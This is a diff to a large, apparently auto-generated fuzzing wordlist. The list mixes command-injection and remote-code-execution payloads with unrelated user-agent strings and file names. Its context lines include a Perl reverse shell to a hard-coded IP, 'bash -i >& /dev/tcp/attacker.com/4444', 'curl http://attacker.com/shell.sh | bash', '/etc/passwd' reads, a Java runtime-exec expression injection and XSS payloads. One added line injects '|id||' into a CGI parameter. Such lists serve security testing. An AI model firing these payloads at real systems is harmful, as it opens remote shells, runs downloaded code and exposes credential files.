@@ -223,6 +223,9 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 && echo "use socket;$i="192.168.16.151";$p=443;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));if(connect(s,sockaddr_in($p,inet_aton($i)))){open(stdin,">&s");open(stdout,">&s");open(stderr,">&s");exec("/bin/sh -i");};" > rev.pl
 && system('curl https://crowdshield.com/.testing/rce_vuln.txt');
 && system('sleep 5');
+&amp;id
+&amp;id=
+&amp;id_currency=
 &id=1;id=2
 &lt;;xml src=";http://ha.ckers.org/xsstest.xml"; id=i&gt;;&lt;;/xml&gt;;
 &lt;xml src=&quot;http://ha.ckers.org/xsstest.xml&quot; id=i&gt;&lt;/xml&gt;
@@ -249,6 +252,7 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 /api/ping/;`id`
 /cgi-bin/live_api.cgi?page={{str}}&id={{num}}&ip=;id;
 /cgi-bin/mastercgi?ping=nomip&user=;id;
+/cgi-bin/operator/servetest?cmd=ntp&servername=pool.ntp.org&timezone=03:00|id||'
 /dgn/dgn_tools/ping.php?ipdm=2;id;
 /eyeos/desktop.php?baccio=eyeoptions.eyeapp&a=eyeoptions.eyeapp&_session%5busr%5d=root&_session%5bapps%5d%5beyeoptions.eyeapp%5d%5bwrapup%5d=system($cmd);&cmd=id
 /index.html|id|
@@ -263,6 +267,7 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 3disallow/action=buy&amp;id=
 3disallow/index.php?act=buy&amp;id=&amp;mod=articles
 3disallow/services/questions-answers/?pagen_&amp;id=&amp;tag
+64disallow&amp;id
 ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
 ; cat /etc/passwd
 ; curl http://attacker.com/shell.sh | bash
@@ -387,6 +392,7 @@ line management engineering system (lems).exe.config
 line management engineering system (lems).vshost.exe
 line management engineering system (lems).vshost.exe.config
 line management engineering system (lems).vshost.exe.manifest
+line management engineering system (lems).xml
 logs/system(1).log
 mods/apage/apage.cgi?f=file.htm.|id|
 mozilla/12.0 (android; linux; u; id) presto/2.8.199 version/11.10 untrusted/1.0
@@ -1566,6 +1572,7 @@ mqqbrowser/3.2/mozilla/5.0 (linux; u; android 4.0.4; id-id; cross a27 build/imm7
 nintendo - family computer disk system (20161023-053252)-xmdb.zip
 nintendo - family computer disk system (20161203-122905_cm).zip
 nintendo - family computer disk system (20161203-122905_rc).zip
+nircmd (already exists).xml
 nokia110/2.0 (03.33) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 (windows; u; windows nt 6.0; id; desktop) applewebkit/534.13 (khtml, like gecko) ucbrowser/9.5.0.449
 nokia110/2.0 (03.33) profile/midp-2.1 configuration/cldc-1.1 ucweb/2.0 (java; u; midp-2.0; id; nokia110) u2/1.0.0 ucbrowser/9.2.0.311 u2/1.0.0 mobile
 nokia110/2.0 (03.33) profile/midp-2.1 configuration/cldc-1.1 ucweb/2.0 (java; u; midp-2.0; id; nokia110) u2/1.0.0 ucbrowser/9.5.0.449 u2/1.0.0 mobile
@@ -3565,6 +3572,7 @@ opera/9.80 (x11; linux zvav; u; id) presto/2.8.119 version/11.10,gzip(gfe)
 ophach/9.99 (bkn android/midp; ophach/99.99.14912/34.1526; u; id) chuck norris/2.8.119 version/11.10
 perl/-e%20%22system('cat%20/etc/passwd');\%22
 persid         = b'p'   # push persistent object; id is taken from string arg
+php_curl_exec()_url_is_controlled_by_user.xml
 por/checkurl.csp?timeout=30&retry=1&url=http://`whoami`.admin.ceye.io
 possible assets/unity [old]/water system (test builds win32 64)/oceanbrdf_windowsbuild/oceanbrdf_windowsbuild/ocean_data/mono/etc/mono/1.0/defaultwsdlhelpgenerator.aspx
 possible assets/unity [old]/water system (test builds win32 64)/oceanbrdf_windowsbuild/oceanbrdf_windowsbuild/ocean_data/mono/etc/mono/2.0/defaultwsdlhelpgenerator.aspx
@@ -3635,6 +3643,8 @@ system('wget https://sn1persecurity.com/.testing/rce_vuln.txt');
 system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
 system('whoami')
 system('whoami');
+system(24-12-2013).xml
+system(8-1-2014).xml
 s|ider
 test*; ls -lhtr /var/www/
 ts;id#
